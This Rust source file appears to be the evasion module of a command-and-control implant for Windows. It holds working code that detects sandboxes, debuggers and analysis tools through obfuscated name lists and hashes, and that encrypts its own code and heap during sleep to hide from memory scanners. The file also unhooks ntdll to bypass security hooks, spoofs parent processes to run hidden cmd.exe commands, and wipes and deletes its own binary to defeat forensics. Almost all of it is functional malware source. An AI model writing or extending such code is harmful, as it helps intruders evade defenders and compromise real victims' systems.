//! Evasion monitor — pre-flight and in-loop checks.
//!
//! abort_if_sandboxed() runs once at startup. should_abort() runs every loop iteration.
//! Both return true if the agent should silently exit without doing anything.

const NO_EVASION: bool = {
    let b = env!("DM_NO_EVASION").as_bytes();
    b.len() == 4 && b[0] == b't' && b[1] == b'r' && b[2] == b'u' && b[3] == b'e'
};

const SLEEP_ENCRYPT: bool = match option_env!("DM_SLEEP_ENCRYPT") {
    Some(v) => {
        let b = v.as_bytes();
        b.len() == 4 && b[0] == b't' && b[1] == b'r' && b[2] == b'u' && b[3] == b'e'
    }
    None => false,
};

/// abort_if_sandboxed runs before registration.
/// Returns true if the environment looks like a sandbox or analysis VM.
pub fn abort_if_sandboxed() -> bool {
    if NO_EVASION { return false; }
    #[cfg(target_os = "windows")]
    {
        if is_sandbox_artifact_present() { return true; }
        if is_suspicious_process_count() { return true; }
        if is_uptime_too_short()         { return true; }
    }
    false
}

/// should_abort runs every poll loop iteration.
/// Returns true if the environment changed in a way that suggests detection.
pub fn should_abort() -> bool {
    if NO_EVASION { return false; }
    #[cfg(target_os = "windows")]
    {
        if is_debugger_present()      { return true; }
        if is_analysis_tool_running() { return true; }
    }
    false
}

pub fn startup_patches() {
    #[cfg(all(target_os = "windows", feature = "unhook"))]
    unhook_ntdll();

    #[cfg(all(target_arch = "x86_64", feature = "stack-spoof"))]
    crate::syscall::init_stack_spoof();
}

/// cleanup removes any artifacts left by the agent before exiting.
/// Called when the server sends a kill signal.
pub fn cleanup() {
    #[cfg(all(target_os = "windows", feature = "self-delete"))]
    self_delete();
}

/// masked_sleep XOR-encrypts the session key and, when text bounds are known
/// from a UDRL staged load, also XOR-encrypts the agent .text section during
/// sleep so memory scanners see no recognisable code at rest.
///
/// .text encryption safety: the 2 pages that contain this function itself are
/// always excluded from the XOR so the encrypt/sleep/decrypt loop never runs
/// from XOR'd bytes. Sleep is issued via the Win32 Sleep() import (kernel32),
/// so no agent .text is needed while the thread is blocked.
///
/// Skipped entirely when DM_NO_EVASION=true or DM_SLEEP_ENCRYPT is not "true".
pub fn masked_sleep(duration: std::time::Duration, key: &mut [u8; 32]) {
    if NO_EVASION || !SLEEP_ENCRYPT {
        std::thread::sleep(duration);
        return;
    }

    let raw = (std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos()
        & 0xFF) as u8;
    let mask = if raw == 0 { 1u8 } else { raw };

    for b in key.iter_mut() { *b ^= mask; }

    #[cfg(all(target_os = "windows", feature = "heap-encrypt"))]
    xor_heap(mask);

    // Step 5: XOR-encrypt .text during sleep if bounds were stored by reflect_pe.
    #[cfg(all(target_os = "windows", feature = "udrl"))]
    let text_encrypted = text_xor_sleep(duration, mask);
    #[cfg(all(target_os = "windows", feature = "udrl"))]
    if text_encrypted { /* sleep was handled inside text_xor_sleep */ } else { std::thread::sleep(duration); }
    #[cfg(not(all(target_os = "windows", feature = "udrl")))]
    std::thread::sleep(duration);

    #[cfg(all(target_os = "windows", feature = "heap-encrypt"))]
    xor_heap(mask);

    for b in key.iter_mut() { *b ^= mask; }
}

/// XOR-encrypts .text (excluding the pages containing this function), sleeps,
/// then decrypts. Returns true if encryption was performed (sleep was handled
/// internally). Returns false if text bounds are unknown — caller must sleep.
#[cfg(all(target_os = "windows", feature = "udrl"))]
#[inline(always)]
fn text_xor_sleep(duration: std::time::Duration, mask: u8) -> bool {
    use core::sync::atomic::Ordering;
    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_READWRITE};
    use windows_sys::Win32::System::Threading::Sleep;

    let base = crate::loader::TEXT_BASE.load(Ordering::Relaxed) as *mut u8;
    let size = crate::loader::TEXT_SIZE.load(Ordering::Relaxed) as usize;
    if base.is_null() || size == 0 { return false; }

    // The 2 pages holding this function must never be XOR'd.
    // We use inline(always) so the code is inlined into masked_sleep's page range.
    let self_page0 = (masked_sleep as *const u8 as usize) & !0xFFF;
    let self_page1 = self_page0.wrapping_add(0x1000);

    // Make .text writable.
    let mut old_prot: u32 = 0;
    if unsafe { VirtualProtect(base as _, size, PAGE_READWRITE, &mut old_prot) } == 0 {
        return false;
    }

    // XOR all pages except the two containing this function.
    unsafe { xor_text_skip(base, size, mask, self_page0, self_page1) };

    // Sleep via kernel32 import — execution stays in kernel32/ntdll; no .text needed.
    let ms = duration.as_millis().min(u32::MAX as u128) as u32;
    unsafe { Sleep(ms) };

    // Decrypt by applying the same mask again (XOR is self-inverse).
    unsafe { xor_text_skip(base, size, mask, self_page0, self_page1) };

    // Restore execute permission.
    unsafe { VirtualProtect(base as _, size, PAGE_EXECUTE_READ, &mut old_prot) };

    true
}

#[cfg(all(target_os = "windows", feature = "udrl"))]
#[inline(always)]
unsafe fn xor_text_skip(base: *mut u8, size: usize, mask: u8, skip0: usize, skip1: usize) {
    let mut off = 0usize;
    while off < size {
        let page_addr = base as usize + off;
        let page_size = 0x1000.min(size - off);
        if page_addr != skip0 && page_addr != skip1 {
            let slice = core::slice::from_raw_parts_mut(base.add(off), page_size);
            for b in slice { *b ^= mask; }
        }
        off += page_size;
    }
}

// ---------------------------------------------------------------------------
// Windows-specific checks
// ---------------------------------------------------------------------------

#[cfg(target_os = "windows")]
fn is_debugger_present() -> bool {
    use windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
    unsafe { IsDebuggerPresent() != 0 }
}

#[cfg(target_os = "windows")]
fn is_sandbox_artifact_present() -> bool {
    use crate::obfs::dec_str;
    let username = std::env::var("USERNAME").unwrap_or_default().to_lowercase();
    // Sandbox-typical usernames — stored XOR'd so they never appear as plaintext
    let sandbox_users = [
        dec_str(&[0x29,0x3B,0x34,0x3E,0x38,0x35,0x22]),       // "sandbox"
        dec_str(&[0x3B,0x34,0x3B,0x36,0x23,0x29,0x2E]),        // "analyst"
        dec_str(&[0x37,0x3B,0x36,0x2E,0x3F,0x29,0x2E]),        // "maltest"
        dec_str(&[0x2E,0x3F,0x29,0x2E]),                        // "test"
        dec_str(&[0x2C,0x33,0x28,0x2F,0x29]),                   // "virus"
        dec_str(&[0x3B,0x2C]),                                   // "av"
        dec_str(&[0x37,0x3B,0x36,0x2D,0x3B,0x28,0x3F]),        // "malware"
    ];
    if sandbox_users.iter().any(|u| username.contains(u.as_str())) {
        return true;
    }

    let hostname = std::env::var("COMPUTERNAME").unwrap_or_default().to_lowercase();
    let sandbox_hosts = [
        dec_str(&[0x29,0x3B,0x34,0x3E,0x38,0x35,0x22]),        // "sandbox"
        dec_str(&[0x3B,0x34,0x3B,0x36,0x23,0x29,0x33,0x29]),   // "analysis"
        dec_str(&[0x2C,0x33,0x28,0x2F,0x29]),                   // "virus"
        dec_str(&[0x37,0x3B,0x36,0x2D,0x3B,0x28,0x3F]),        // "malware"
        dec_str(&[0x39,0x2F,0x39,0x31,0x35,0x35]),              // "cuckoo"
    ];
    if sandbox_hosts.iter().any(|h| hostname.contains(h.as_str())) {
        return true;
    }

    false
}

#[cfg(target_os = "windows")]
pub(crate) fn enum_process_names() -> Vec<String> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };
    let mut names = Vec::new();
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE {
            return names;
        }
        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut entry) != 0 {
            loop {
                let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                names.push(String::from_utf16_lossy(&entry.szExeFile[..len]).to_lowercase());
                if Process32NextW(snap, &mut entry) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snap);
    }
    names
}

#[cfg(target_os = "windows")]
fn is_suspicious_process_count() -> bool {
    enum_process_names().len() < 30
}

#[cfg(target_os = "windows")]
fn is_uptime_too_short() -> bool {
    // Sandboxes are often freshly booted; uptime < 5 min is suspicious
    use windows_sys::Win32::System::SystemInformation::GetTickCount64;
    let uptime_ms = unsafe { GetTickCount64() };
    uptime_ms < 5 * 60 * 1000
}

#[cfg(target_os = "windows")]
fn is_analysis_tool_running() -> bool {
    // DJB2 hashes of analysis tool names (all lowercase) — no tool name string
    // appears in the binary; only the u32 hashes are embedded.
    const fn djb2(s: &[u8]) -> u32 { crate::obfs::djb2(s) }
    const TOOL_HASHES: &[u32] = &[
        djb2(b"wireshark.exe"),
        djb2(b"procmon.exe"),
        djb2(b"procmon64.exe"),
        djb2(b"processhacker.exe"),
        djb2(b"x64dbg.exe"),
        djb2(b"x32dbg.exe"),
        djb2(b"ollydbg.exe"),
        djb2(b"ida.exe"),
        djb2(b"ida64.exe"),
        djb2(b"idag.exe"),
        djb2(b"idat.exe"),
        djb2(b"autoruns.exe"),
        djb2(b"autoruns64.exe"),
        djb2(b"fiddler.exe"),
        djb2(b"burpsuite.exe"),
        djb2(b"dnspy.exe"),
        djb2(b"dotpeek64.exe"),
    ];
    enum_process_names()
        .iter()
        .any(|n| TOOL_HASHES.contains(&djb2(n.as_bytes())))
}

// ── Phase 3 evasion primitives ────────────────────────────────────────────────

// ---------------------------------------------------------------------------
// Step 2: PPID-spoofed shell spawner
// Spawns cmd.exe /C <cmd> with CREATE_NO_WINDOW under an explorer.exe parent
// so the child process tree doesn't point back to the agent.
// ---------------------------------------------------------------------------

/// Spawn a shell command with PPID spoofing and return combined stdout+stderr.
#[cfg(all(target_os = "windows", feature = "ppid-spoof"))]
pub fn spawn_shell_spoofed(cmd: &str) -> Result<Vec<u8>, &'static str> {
    use windows_sys::Win32::Foundation::{CloseHandle, FALSE, INVALID_HANDLE_VALUE, HANDLE};
    use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
    use windows_sys::Win32::Storage::FileSystem::ReadFile;
    use windows_sys::Win32::System::Pipes::CreatePipe;
    use windows_sys::Win32::System::Threading::{
        CreateProcessW, InitializeProcThreadAttributeList, OpenProcess,
        UpdateProcThreadAttribute, WaitForSingleObject,
        EXTENDED_STARTUPINFO_PRESENT, PROCESS_INFORMATION, STARTUPINFOEXW,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, STARTF_USESTDHANDLES,
        DeleteProcThreadAttributeList,
    };

    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    const PROCESS_CREATE_PROCESS: u32 = 0x0080;
    const INFINITE: u32 = 0xFFFF_FFFF;

    // Prefer explorer.exe as the spoofed parent; fall back to winlogon.exe
    let parent_pid = find_pid_by_name("explorer.exe")
        .or_else(|| find_pid_by_name("winlogon.exe"))
        .ok_or("no suitable ppid spoof parent found")?;

    let parent = unsafe { OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid) };
    if parent == 0 || parent == INVALID_HANDLE_VALUE {
        return Err("OpenProcess for ppid spoof failed");
    }

    // Inheritable SECURITY_ATTRIBUTES for the stdout pipe write end.
    let sa = SECURITY_ATTRIBUTES {
        nLength:              core::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
        lpSecurityDescriptor: core::ptr::null_mut(),
        bInheritHandle:       1,
    };

    let (mut rd, mut wr): (HANDLE, HANDLE) = (0, 0);
    if unsafe { CreatePipe(&mut rd, &mut wr, &sa, 0) } == 0 {
        unsafe { CloseHandle(parent) };
        return Err("CreatePipe failed");
    }

    // Make the read end non-inheritable so the child doesn't hold it open.
    extern "system" { fn SetHandleInformation(h: HANDLE, mask: u32, flags: u32) -> i32; }
    unsafe { SetHandleInformation(rd, 1 /*HANDLE_FLAG_INHERIT*/, 0); }

    // Build the proc-thread attribute list: PPID override + explicit handle list.
    // When PROC_THREAD_ATTRIBUTE_PARENT_PROCESS is set, the child inherits handles
    // from the spoofed parent (explorer.exe), not from us — so the pipe write end
    // would never reach cmd.exe.  PROC_THREAD_ATTRIBUTE_HANDLE_LIST overrides this
    // by explicitly naming which handles to pass through, regardless of parent.
    const PROC_THREAD_ATTRIBUTE_HANDLE_LIST: usize = 0x0002_0002;

    let mut attr_size: usize = 0;
    unsafe { InitializeProcThreadAttributeList(core::ptr::null_mut(), 2, 0, &mut attr_size) };
    if attr_size == 0 {
        unsafe { CloseHandle(rd); CloseHandle(wr); CloseHandle(parent) };
        return Err("InitializeProcThreadAttributeList sizing failed");
    }
    let mut attr_buf = vec![0u8; attr_size];
    let attr_list = attr_buf.as_mut_ptr() as *mut _;
    if unsafe { InitializeProcThreadAttributeList(attr_list, 2, 0, &mut attr_size) } == 0 {
        unsafe { CloseHandle(rd); CloseHandle(wr); CloseHandle(parent) };
        return Err("InitializeProcThreadAttributeList init failed");
    }
    let mut parent_val: HANDLE = parent;
    if unsafe {
        UpdateProcThreadAttribute(
            attr_list, 0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
            &mut parent_val as *mut HANDLE as *mut _,
            core::mem::size_of::<HANDLE>(),
            core::ptr::null_mut(), core::ptr::null_mut(),
        )
    } == 0 {
        unsafe { DeleteProcThreadAttributeList(attr_list); CloseHandle(rd); CloseHandle(wr); CloseHandle(parent) };
        return Err("UpdateProcThreadAttribute(parent) failed");
    }
    let mut inherit_list: [HANDLE; 1] = [wr];
    if unsafe {
        UpdateProcThreadAttribute(
            attr_list, 0,
            PROC_THREAD_ATTRIBUTE_HANDLE_LIST,
            inherit_list.as_mut_ptr() as *mut _,
            core::mem::size_of_val(&inherit_list),
            core::ptr::null_mut(), core::ptr::null_mut(),
        )
    } == 0 {
        unsafe { DeleteProcThreadAttributeList(attr_list); CloseHandle(rd); CloseHandle(wr); CloseHandle(parent) };
        return Err("UpdateProcThreadAttribute(handle_list) failed");
    }

    // Redirect stdout + stderr to the write end of our pipe.
    let mut si: STARTUPINFOEXW = unsafe { core::mem::zeroed() };
    si.StartupInfo.cb        = core::mem::size_of::<STARTUPINFOEXW>() as u32;
    si.StartupInfo.dwFlags   = STARTF_USESTDHANDLES;
    si.StartupInfo.hStdInput  = INVALID_HANDLE_VALUE;
    si.StartupInfo.hStdOutput = wr;
    si.StartupInfo.hStdError  = wr;
    si.lpAttributeList        = attr_list;

    let cmdline = format!("cmd.exe /C {cmd}");
    let mut cmdline_w: Vec<u16> = cmdline.encode_utf16().chain(core::iter::once(0)).collect();

    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };
    let ok = unsafe {
        CreateProcessW(
            core::ptr::null(),
            cmdline_w.as_mut_ptr(),
            core::ptr::null_mut(), core::ptr::null_mut(),
            1, // bInheritHandles = TRUE so write pipe is passed to child
            CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
            core::ptr::null_mut(), core::ptr::null_mut(),
            &mut si.StartupInfo,
            &mut pi,
        )
    };

    unsafe {
        DeleteProcThreadAttributeList(attr_list);
        CloseHandle(wr); // child holds it; close our copy so ReadFile gets EOF
        CloseHandle(parent);
    }

    if ok == 0 {
        unsafe { CloseHandle(rd) };
        return Err("CreateProcessW (spoofed) failed");
    }

    // Drain the pipe until the child exits.
    let mut out = Vec::new();
    let mut buf = [0u8; 4096];
    loop {
        let mut n: u32 = 0;
        if unsafe { ReadFile(rd, buf.as_mut_ptr(), buf.len() as u32, &mut n, core::ptr::null_mut()) } == 0
            || n == 0 { break; }
        out.extend_from_slice(&buf[..n as usize]);
    }
    unsafe {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(rd);
    }
    Ok(out)
}

/// Find the first PID whose exe name (case-insensitive) matches `name`.
#[cfg(all(target_os = "windows", feature = "ppid-spoof"))]
fn find_pid_by_name(name: &str) -> Option<u32> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };
    let lower = name.to_ascii_lowercase();
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE { return None; }
        let mut e: PROCESSENTRY32W = core::mem::zeroed();
        e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut e) != 0 {
            loop {
                let nlen = e.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                let n = String::from_utf16_lossy(&e.szExeFile[..nlen]).to_ascii_lowercase();
                if n == lower { CloseHandle(snap); return Some(e.th32ProcessID); }
                e = core::mem::zeroed();
                e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
                if Process32NextW(snap, &mut e) == 0 { break; }
            }
        }
        CloseHandle(snap);
    }
    None
}


/// Rebind our own module's ntdll IAT entries to a fresh, unhooked copy of ntdll.
///
/// Avoids VirtualProtect on any DLL section. Instead:
///   1. Load clean ntdll bytes from disk.
///   2. Map a fresh copy via NtCreateSection + NtMapViewOfSection (pagefile-backed,
///      RWX — same class of event as CLR/JIT allocations; no PROTECTVM_LOCAL event).
///   3. Walk our own import directory for ntdll and patch each IAT pointer.
///      The IAT lives in our writable .data/.idata section — no protection change needed.
#[cfg(all(target_os = "windows", feature = "unhook"))]
pub fn unhook_ntdll() {
    #[cfg(target_arch = "x86_64")]
    unsafe { rebind_ntdll_iat() }
}

#[cfg(all(target_os = "windows", target_arch = "x86_64", feature = "unhook"))]
unsafe fn rebind_ntdll_iat() {
    use crate::syscall;

    const PAGE_EXECUTE_READ:    u32 = 0x20;
    const SECTION_MAP_READ:     u32 = 0x0004;
    const SECTION_MAP_EXECUTE:  u32 = 0x0008;
    const OBJ_CASE_INSENSITIVE: u32 = 0x0040;

    #[repr(C)]
    struct UStr {
        length: u16, max_length: u16,
        buffer: *const u16,
    }
    #[repr(C)]
    struct OA {
        length: u32, _p0: u32,
        root: usize,
        name: *const UStr,
        attrs: u32, _p1: u32,
        sec: usize, qos: usize,
    }
    const _: () = assert!(core::mem::size_of::<UStr>() == 16);
    const _: () = assert!(core::mem::size_of::<OA>()   == 48);

    // \KnownDlls\ntdll.dll — 20 chars, XOR'd with 0x5A so no plaintext in binary
    const ENC: [u8; 20] = [
        0x06,0x11,0x34,0x35,0x2D,0x34,0x1E,0x36,0x36,0x29,
        0x06,0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,
    ];
    let mut wide = [0u16; 21];
    for i in 0..20 { wide[i] = (ENC[i] ^ 0x5A) as u16; }

    let ustr = UStr { length: 40, max_length: 42, buffer: wide.as_ptr() };
    let oa   = OA {
        length: core::mem::size_of::<OA>() as u32, _p0: 0,
        root: 0, name: &ustr as *const UStr,
        attrs: OBJ_CASE_INSENSITIVE, _p1: 0,
        sec: 0, qos: 0,
    };

    let mut hsec: isize = 0;
    if syscall::nt_open_section(
        &mut hsec, SECTION_MAP_READ | SECTION_MAP_EXECUTE,
        &oa as *const OA as *const u8,
    ) != 0 || hsec == 0 { return; }

    let mut fresh: *mut u8 = core::ptr::null_mut();
    let mut vsz: usize = 0;
    let st = syscall::nt_map_view(hsec, syscall::CURRENT_PROCESS, &mut fresh, &mut vsz, PAGE_EXECUTE_READ);
    syscall::nt_close(hsec);
    if st != 0 || fresh.is_null() { return; }
    // fresh stays mapped — IAT entries will point into it

    // ntdll base via PEB InMemoryOrderModuleList[1] (no string needed)
    let peb: usize;
    core::arch::asm!("mov {:r}, gs:[0x60]", out(reg) peb, options(nostack, nomem));
    let ldr      = *((peb + 0x18) as *const usize);
    let im0_fwd  = *((ldr  + 0x20) as *const usize); // [0] exe InMemoryOrderLinks flink
    let im1_fwd  = *(im0_fwd as *const usize);        // [1] ntdll InMemoryOrderLinks flink
    // DllBase at LDTE+0x30; InMemoryOrderLinks at LDTE+0x10 → offset from flink = +0x20
    let ntdll_base = *((im1_fwd + 0x20) as *const usize);
    if ntdll_base == 0 { syscall::nt_unmap_view(syscall::CURRENT_PROCESS, fresh); return; }
    let nh = core::slice::from_raw_parts(ntdll_base as *const u8, 0x200);
    let nl = u32::from_le_bytes([nh[0x3C],nh[0x3D],nh[0x3E],nh[0x3F]]) as usize;
    if nl + 0x60 > nh.len() { syscall::nt_unmap_view(syscall::CURRENT_PROCESS, fresh); return; }
    let no = nl + 4 + 20;
    let ntdll_sz  = u32::from_le_bytes([nh[no+56],nh[no+57],nh[no+58],nh[no+59]]) as usize;
    let ntdll_end = ntdll_base + ntdll_sz;

    let own_base = *((im0_fwd + 0x20) as *const usize);
    if own_base == 0 { return; }

    // DJB2 hash comparison — zero plaintext "ntdll.dll" in the binary
    const fn djb2(s: &[u8]) -> u32 { crate::obfs::djb2(s) }
    const NTDLL_H: u32 = djb2(b"ntdll.dll");

    let op = own_base as *const u8;
    let o_lfa  = *(op.add(0x3C) as *const u32) as usize;
    let o_fh   = o_lfa + 4;
    let o_opsz = *(op.add(o_fh + 16) as *const u16) as usize;
    let o_oh   = o_fh + 20;
    if *(op.add(o_oh + 108) as *const u32) < 2 { return; }
    let imp_rva = *(op.add(o_oh + 120) as *const u32) as usize; // DataDirectory[1].VirtualAddress
    if imp_rva == 0 { return; }

    let mut desc = op.add(imp_rva) as *const [u32; 5];
    'outer: loop {
        let d = &*desc;
        if d[3] == 0 { break; }
        let np = op.add(d[3] as usize);
        let mut len = 0usize;
        while *np.add(len) != 0 { len += 1; }
        let mut buf = [0u8; 64];
        let cl = len.min(63);
        for i in 0..cl { buf[i] = (*np.add(i)).to_ascii_lowercase(); }
        if djb2(&buf[..cl]) != NTDLL_H { desc = desc.add(1); continue 'outer; }

        let oft_rva = if d[0] != 0 { d[0] as usize } else { d[4] as usize };
        let ft_rva  = d[4] as usize;
        let mut oft = op.add(oft_rva) as *const u64;
        let mut ft  = (own_base as *mut u8).add(ft_rva) as *mut u64;
        loop {
            let thunk = *oft;
            if thunk == 0 { break; }
            let cur = *ft as usize;
            if cur >= ntdll_base && cur < ntdll_end {
                let new_fn = if thunk >> 63 != 0 {
                    crate::loader::get_export_by_ordinal(fresh as usize, (thunk & 0xFFFF) as u16)
                } else {
                    crate::loader::get_export_by_name(fresh as usize,
                        op.add((thunk as u32 & 0x7FFF_FFFF) as usize + 2))
                };
                if let Some(p) = new_fn { *ft = p as u64; }
            }
            oft = oft.add(1);
            ft  = ft.add(1);
        }
        break;
    }
}

/// XOR-mask every live heap allocation with `key`.
/// Called twice (before and after sleep) to encrypt and then decrypt in place.
/// HeapLock prevents concurrent allocations from racing with our walk.
#[cfg(all(target_os = "windows", feature = "heap-encrypt"))]
fn xor_heap(key: u8) {
    use windows_sys::Win32::System::Memory::{
        GetProcessHeap, HeapLock, HeapUnlock, HeapWalk, PROCESS_HEAP_ENTRY,
    };

    const PROCESS_HEAP_ENTRY_BUSY: u16 = 0x0004;

    unsafe {
        let heap = GetProcessHeap();
        if heap == 0 { return; }
        if HeapLock(heap) == 0 { return; }

        let mut entry: PROCESS_HEAP_ENTRY = core::mem::zeroed();
        // HeapWalk returns 0 when there are no more entries.
        while HeapWalk(heap, &mut entry) != 0 {
            if entry.wFlags & PROCESS_HEAP_ENTRY_BUSY != 0 {
                let ptr = entry.lpData as *mut u8;
                let size = entry.cbData as usize;
                for i in 0..size {
                    *ptr.add(i) ^= key;
                }
            }
        }

        HeapUnlock(heap);
    }
}

/// Overwrite and delete the agent executable from disk so it leaves no binary on disk
/// after the operator issues a kill command.
#[cfg(all(target_os = "windows", feature = "self-delete"))]
pub fn self_delete() {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileW, DeleteFileW, WriteFile,
        FILE_SHARE_DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE,
        OPEN_EXISTING,
    };
    use windows_sys::Win32::System::LibraryLoader::GetModuleFileNameW;

    // GENERIC_WRITE = 0x40000000
    const GENERIC_WRITE: u32 = 0x40000000;

    unsafe {
        let mut path = [0u16; 32768];
        let len = GetModuleFileNameW(0, path.as_mut_ptr(), path.len() as u32);
        if len == 0 { return; }

        // Overwrite the file with zeros before deleting to defeat file-carving recovery.
        let h = CreateFileW(
            path.as_ptr(),
            GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            core::ptr::null_mut(),
            OPEN_EXISTING,
            0,
            0,
        );
        if h != INVALID_HANDLE_VALUE && h != 0 {
            let zeros = vec![0u8; 65536];
            let mut written: u32 = 0;
            loop {
                let ok = WriteFile(h, zeros.as_ptr(), zeros.len() as u32, &mut written, core::ptr::null_mut());
                if ok == 0 || written == 0 { break; }
            }
            CloseHandle(h);
        }

        DeleteFileW(path.as_ptr());
    }
}
